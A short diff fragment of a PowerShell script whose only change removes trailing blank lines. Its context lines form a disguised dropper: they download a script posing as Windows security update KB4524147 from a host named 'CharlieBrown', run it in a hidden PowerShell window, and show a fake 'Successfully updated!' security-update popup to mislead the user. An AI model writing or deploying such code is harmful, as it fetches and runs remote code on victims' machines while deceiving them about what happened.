@@ -4,14 +4,3 @@ iwr -Uri "http://CharlieBrown/Update-KB4524147.ps1" -OutFile "$Env:TMP\Update-KB
 Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "powershell -File $Env:TMP\Update-KB4524147.ps1"|Out-Null
 powershell (New-Object -ComObject Wscript.Shell).Popup("Successfully updated! - Version: 45.19041.964.0",3,"                      Cumulative Security KB4524147 Update",0+64)|Out-Null
 exit
-
-
-
-
-
-
-
-
-
-
-
